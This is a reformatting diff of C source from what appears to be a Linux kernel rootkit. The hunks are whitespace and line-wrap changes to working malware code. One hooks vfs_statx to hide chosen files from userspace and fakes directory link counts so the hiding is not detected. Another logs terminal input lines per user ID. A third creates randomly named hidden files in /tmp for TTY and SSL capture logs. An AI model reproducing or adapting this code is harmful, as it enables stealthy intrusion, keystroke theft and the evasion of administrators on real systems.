@@ -889,7 +889,7 @@ static int _key_update(uid_t uid, char byte, int flags)
 			node->buf[node->offset++] = '\n';
 			node->buf[node->offset] = 0;
 
-            _tty_write_log(uid, node->buf, strlen(node->buf));
+			_tty_write_log(uid, node->buf, strlen(node->buf));
 
 			list_del(&node->list);
 			kfree(node);
@@ -1051,61 +1051,66 @@ ftrace_get_regs(struct ftrace_regs *fregs)
 }
 #endif
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
 #define __MAXLEN 256
-static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
-static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
+static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *,
+			      u32);
+static long m_vfs_statx(int dfd, const char __user *filename, int flags,
+			struct kstat *stat, u32 request_mask)
+{
 #else
 static long (*real_vfs_statx)(int, struct filename *, int, struct kstat *, u32);
 static long m_vfs_statx(int dfd, struct filename *filename, int flags,
 			struct kstat *stat, u32 request_mask)
 {
 #endif
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
-    char *target = kzalloc(__MAXLEN, GFP_KERNEL);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
+	char *target = kzalloc(__MAXLEN, GFP_KERNEL);
 #else
-    const char *target = filename ? filename->name : "";
+	const char *target = filename ? filename->name : "";
 #endif
 
-    /* call original first, I want stat */
-    long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
+	/* call original first, I want stat */
+	long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
 
-    /**
+	/**
      *  Return not found to userspace if target is present (file,dir),
      *  otherwise count the number of hidden hard-links
      *      and use it to decrement "Links:"
      *  Check: if it can be optimized
      * */
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
-    if (target != NULL && !copy_from_user((void*)target, filename, __MAXLEN-1)) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
+	if (target != NULL &&
+	    !copy_from_user((void *)target, filename, __MAXLEN - 1)) {
 #endif
-        const char *name = fs_get_basename(target);
-        if (fs_search_name(name, stat->ino)) {
-            rv = -ENOENT;
-            goto leave;
-        }
+		const char *name = fs_get_basename(target);
+		if (fs_search_name(name, stat->ino)) {
+			rv = -ENOENT;
+			goto leave;
+		}
 
-        /* nothing found for this entry.
+		/* nothing found for this entry.
          * Tamper 'nlink', if needed.
          */
-        if (S_ISDIR(stat->mode)) {
-            int count = fs_is_dir_inode_hidden(stat->ino);
-            if (count > 0) {
-                prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
-                stat->nlink -= count;
-            }
-        }
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
-    }
+		if (S_ISDIR(stat->mode)) {
+			int count = fs_is_dir_inode_hidden(stat->ino);
+			if (count > 0) {
+				prinfo("%s: file match ino=%llu nlink=%d count=%d\n",
+				       __func__, stat->ino, stat->nlink, count);
+				stat->nlink -= count;
+			}
+		}
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
+	}
 #endif
 
 leave:
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
-    if (target != NULL) {
-        kfree(target);
-    }
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
+	if (target != NULL) {
+		kfree(target);
+	}
 #endif
-    return rv;
+	return rv;
 }
 
 /**
@@ -1366,34 +1371,34 @@ struct sysfiles_t {
 	char sslfile[PATH_MAX];
 };
 static struct sysfiles_t sysfiles;
-static bool _sys_file_init(void) {
+static bool _sys_file_init(void)
+{
+	bool rc = false;
+	char *tty, *ssl;
+	size_t min = 16, max = 64, len = 0;
+	u8 rnd = 0;
 
-    bool rc = false;
-    char *tty, *ssl;
-    size_t min = 16, max = 64, len = 0;
-    u8 rnd = 0;
+	get_random_bytes(&rnd, sizeof(rnd));
+	len = min + (rnd % (max - min + 1));
+	tty = kv_util_random_AZ_string(len);
 
-    get_random_bytes(&rnd, sizeof(rnd));
-    len = min + (rnd % (max - min + 1));
-    tty = kv_util_random_AZ_string(len);
+	/** repeat */
+	get_random_bytes(&rnd, sizeof(rnd));
+	len = min + (rnd % (max - min + 1));
+	ssl = kv_util_random_AZ_string(len);
 
-    /** repeat */
-    get_random_bytes(&rnd, sizeof(rnd));
-    len = min + (rnd % (max - min + 1));
-    ssl = kv_util_random_AZ_string(len);
+	if (tty && ssl) {
+		snprintf(sysfiles.ttyfile, sizeof(sysfiles.ttyfile) - 1,
+			 "/tmp/.%s", tty);
 
-    if (tty && ssl) {
-        snprintf(sysfiles.ttyfile,
-                sizeof(sysfiles.ttyfile)-1, "/tmp/.%s", tty);
+		snprintf(sysfiles.sslfile, sizeof(sysfiles.sslfile) - 1,
+			 "/tmp/.%s", ssl);
+		kv_mem_free(&tty, &ssl);
 
-        snprintf(sysfiles.sslfile,
-                sizeof(sysfiles.sslfile)-1, "/tmp/.%s", ssl);
-        kv_mem_free(&tty, &ssl);
+		rc = true;
+	}
 
-        rc = true;
-    }
-
-    return rc;
+	return rc;
 }
 
 char *sys_get_ttyfile(void)
@@ -1409,9 +1414,9 @@ bool sys_init(void)
 {
 	int idx = 0, rc = false;
 
-    if (_sys_file_init()) {
-        char *tty = strrchr(sys_get_ttyfile(), '.');
-        char *ssl = strrchr(sys_get_sslfile(), '.');
+	if (_sys_file_init()) {
+		char *tty = strrchr(sys_get_ttyfile(), '.');
+		char *ssl = strrchr(sys_get_sslfile(), '.');
 
 		if (!tty || !ssl) {
 			prerr("sys_init: Invalid parameter\n");
